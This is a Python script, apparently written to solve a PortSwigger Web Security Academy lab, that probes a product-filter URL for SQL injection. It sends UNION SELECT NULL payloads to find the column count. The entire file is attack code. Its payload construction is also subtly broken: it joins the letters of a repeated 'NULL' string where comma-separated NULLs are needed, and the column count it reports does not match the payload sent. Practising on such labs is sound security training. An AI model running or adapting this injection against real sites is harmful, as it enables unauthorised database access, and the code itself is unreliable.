import requests, signal, sys

def obtener_columnas(URL):
    for columna in range(0,100):
        char_null = 'NULL'
        columns_num = char_null*columna
        payload = URL + "%27+UNION+SELECT+NULL{}--".format(','.join(columns_num))

        #GET /filter?category=Lifestyle%27+UNION+SELECT+NULL,NULL,NULL--
        print("Realizando peticion a: {}".format(payload))
        respuesta = requests.get(payload)
        print("Codigo de estado: {}\n".format(respuesta.status_code))

        if respuesta.status_code == 200:
            print("El numero de columna es: {}".format(columna+1))
            break

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

def main():
    URL = "https://ac6c1fff1ff884a0801bc99a00a700bb.web-security-academy.net/filter?category=Gifts"
    #Usando union
    signal.signal(signal.SIGINT, def_handler)

    obtener_columnas(URL)

if __name__ == "__main__":
    main()